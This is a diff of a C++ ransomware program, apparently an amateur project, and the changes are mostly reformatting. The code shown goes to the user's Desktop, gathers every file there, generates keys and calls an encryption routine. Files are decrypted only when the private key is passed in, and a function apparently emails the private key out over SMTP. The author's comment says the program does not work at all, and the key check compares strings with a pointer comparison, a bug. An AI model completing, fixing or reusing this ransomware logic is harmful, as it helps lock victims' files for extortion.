@@ -1,8 +1,8 @@
-//Created by Sebastian Hyjek
-//#09/16/2024
-//having problems with installing the cryptography modules i need
-//this program does not work at all
-// next time you work on this project look to use openssl
+// Created by Sebastian Hyjek
+// #09/16/2024
+// having problems with installing the cryptography modules i need
+// this program does not work at all
+
 #include <direct.h>
 #include <iostream>
 #include <cstdlib>
@@ -73,54 +73,61 @@ int sendDelPrivKey()
     }
     else
     {
-        _tprintf(_T("Failed to send email with the following error: %s\n"), (const TCHAR*)oSmtp->GetLastErrDescription());
+        _tprintf(_T("Failed to send email with the following error: %s\n"), (const TCHAR *)oSmtp->GetLastErrDescription());
     }
 
     return 0;
 }
 
-
-
-int main(int argc, char *argv[]) {
+int main(int argc, char *argv[])
+{
     if (argc > 2)
     {
         cout << "Too many arguments\nUsage: <ransomware.exe> private_key.pem" << endl;
         return 1;
     }
-//cd into the Desktop directory
+    // cd into the Desktop directory
     char currentDir[256];
     _getcwd(currentDir, sizeof(currentDir));
 
-    const char* username = getenv("USERNAME");
-    if (username) {
+    const char *username = getenv("USERNAME");
+    if (username)
+    {
         string newPath = "C:\\Users\\" + std::string(username) + "\\Desktop";
-        if (_chdir(newPath.c_str()) == 0) {
+        if (_chdir(newPath.c_str()) == 0)
+        {
             _getcwd(currentDir, sizeof(currentDir));
-        } else {
+        }
+        else
+        {
             cerr << "Failed to change directory" << endl;
         }
-    } else {
+    }
+    else
+    {
         cerr << "Failed to get username" << endl;
     }
 
-    //collect files into an iterable list
+    // collect files into an iterable list
     vector<fs::path> fileList;
     string cwd = _getcwd(currentDir, sizeof(currentDir));
     try
     {
-        for (const auto& entry : fs::directory_iterator(cwd))
+        for (const auto &entry : fs::directory_iterator(cwd))
         {
             if (is_regular_file(entry.status()) && entry.path().filename() != "ransomware.exe")
             {
                 fileList.push_back(entry.path());
             }
         }
-    }catch (const fs::filesystem_error& e) {
+    }
+    catch (const fs::filesystem_error &e)
+    {
         cerr << "Error: " << e.what() << endl;
     }
-    //determine if the public key has already been generated
+    // determine if the public key has already been generated
     fs::path filePath = "public_key.pem";
-    if(!is_regular_file(filePath))
+    if (!is_regular_file(filePath))
     {
         generateKeys();
         encryptFiles();
@@ -128,7 +135,7 @@ int main(int argc, char *argv[]) {
 
     if (argv[1] == "private_key.pem")
     {
-        if(!decryptFiles())
+        if (!decryptFiles())
         {
             cerr << "Failed to decrypt files\nIncorrect Key" << endl;
         }
@@ -137,4 +144,3 @@ int main(int argc, char *argv[]) {
 
     return 0;
 }
-
